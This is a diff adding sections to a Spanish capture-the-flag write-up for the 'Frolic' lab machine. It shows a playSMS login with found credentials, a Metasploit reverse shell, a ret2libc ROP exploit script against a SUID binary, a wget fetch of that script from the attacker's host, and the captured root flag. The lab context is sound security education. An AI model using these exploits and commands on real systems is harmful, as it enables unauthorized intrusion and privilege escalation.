@@ -292,6 +292,13 @@ Una vez que decodifico el mensaje en base64, obtengo un mensaje encriptado que p
 
 <img src='/images/portfolio/frolic/result_ecnr_3.png' width='900' height=auto><br/><br/>
 
+playSMS
+------
+
+Obtengo lo que parece ser una contraseña 'idkwhatispass'. Si intento acceder con las credenciales 'admin:idkwhatispass' consigo acceso finalmente.<br/>
+
+<img src='/images/portfolio/frolic/playsmsIndex.png' width='900' height=auto><br/><br/>
+
 Metasploit
 ------
 
@@ -313,7 +320,7 @@ Buscando en Metasploit, encuentro un exploit con playSMS como víctima.<br/>
 
     Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/playsms_filename_exec
 
-Utilizaré el exploit 0 ya que parece que puedo conseguir un reverse shell. Relleno los campos necesarios y arranco el exploit obteniendo un reverse shell de manera satisfactoria.<br/>
+Utilizaré el exploit 0 ya que parece que puedo conseguir un reverse shell. Relleno los campos necesarios y arranco el exploit obteniendo un reverse shell de manera satisfactoria. Ahora procederé a buscar el flag de usuario.<br/>
 
     msf6 exploit(multi/http/playsms_uploadcsv_exec) > show options
 
@@ -359,6 +366,99 @@ Utilizaré el exploit 0 ya que parece que puedo conseguir un reverse shell. Rell
     meterpreter > shell
     Process 2102 created.
     Channel 0 created.
+    python -c "import pty;pty.spawn('/bin/bash')"
+    www-data@frolic:~/html/playsms$ whoami
     whoami
     www-data
+    www-data@frolic:~/html/playsms$ cd /home
+    cd /home
+    www-data@frolic:/home$ ls
+    ls
+    ayush  sahay
+    www-data@frolic:/home$ cd ayush
+    cd ayush
+    www-data@frolic:/home/ayush$ ls
+    ls
+    user.txt
+    www-data@frolic:/home/ayush$ cat user.txt
+    cat user.txt
+    53dbb7c2cce2e8dea328e2e725a98093
 
+Ahora como siempre hay que buscar la forma de escalar privilegios.<br/>
+
+Escalado de privilegios
+------
+
+Estando en la carpeta personal de ayush, si accedo a la carpeta .binary, me encuentro un fichero 'rop' con permisos de superusuario.<br/>
+
+    www-data@frolic:/home/ayush$ ls -lah
+    ls -lah
+    total 28K
+    drwxr-xr-x 3 ayush ayush 4.0K Sep  9  2022 .
+    drwxr-xr-x 4 root  root  4.0K Sep  9  2022 ..
+    lrwxrwxrwx 1 root  root     9 Sep  9  2022 .bash_history -> /dev/null
+    -rw-r--r-- 1 ayush ayush  220 Sep 23  2018 .bash_logout
+    -rw-r--r-- 1 ayush ayush 3.7K Sep 23  2018 .bashrc
+    drwxrwxr-x 2 ayush ayush 4.0K Sep  9  2022 .binary
+    -rw-r--r-- 1 ayush ayush  655 Sep 23  2018 .profile
+    -rwxr-xr-x 1 ayush ayush   33 Jan 22 17:08 user.txt
+    www-data@frolic:/home/ayush$ cd .binary
+    cd .binary
+    www-data@frolic:/home/ayush/.binary$ ls -lah
+    ls -lah
+    total 16K
+    drwxrwxr-x 2 ayush ayush 4.0K Sep  9  2022 .
+    drwxr-xr-x 3 ayush ayush 4.0K Sep  9  2022 ..
+    -rwsr-xr-x 1 root  root  7.4K Sep 25  2018 rop
+
+Investigando por la red, me topé con un .py idóneo para este caso con el que podía escalar privilegios a través de un archivo que tuviera permisos root. El código del script es el siguiente.<br/>
+
+    from struct import pack
+    from subprocess import call
+
+    system = 0xb7e19000 + 0x0003ada0
+    exit = 0xb7e19000 + 0x0002e9d0
+    binsh = 0xb7e19000 + 0x0015ba0b
+
+    def p32(num):
+        return pack("<I",num)
+
+    buf = "A"*52
+    buf += p32(system)
+    buf += p32(exit)
+    buf += p32(binsh)
+
+    call(["/home/ayush/.binary/rop", buf])
+
+Descargando el fichero .py en el reverse shell y ejecutándolo, ya pude obtener permisos root y obtener el flag.<br/>
+
+    www-data@frolic:/home/ayush/.binary$ cd /tmp
+    cd /tmp
+    www-data@frolic:/tmp$ wget http://10.10.14.31:8000/root.py
+    wget http://10.10.14.31:8000/root.py
+    --2024-01-22 21:02:59--  http://10.10.14.31:8000/root.py
+    Connecting to 10.10.14.31:8000... connected.
+    HTTP request sent, awaiting response... 200 OK
+    Length: 299 [text/x-python]
+    Saving to: 'root.py'
+
+    root.py             100%[===================>]     299  --.-KB/s    in 0s      
+
+    2024-01-22 21:02:59 (45.5 MB/s) - 'root.py' saved [299/299]
+
+    www-data@frolic:/tmp$ ls
+    ls
+    phpCn1hMM
+    phpKxR7SO
+    phpdjmofS
+    root.py
+    systemd-private-197208657a144e7f9c79dc2be7ff4b0e-systemd-timesyncd.service-50Quii
+    vmware-root
+    www-data@frolic:/tmp$ python root.py
+    python root.py
+    # whoami
+    whoami
+    root
+    # cat /root/root.txt
+    cat /root/root.txt
+    c020cc467941e3af5556008005c5081c
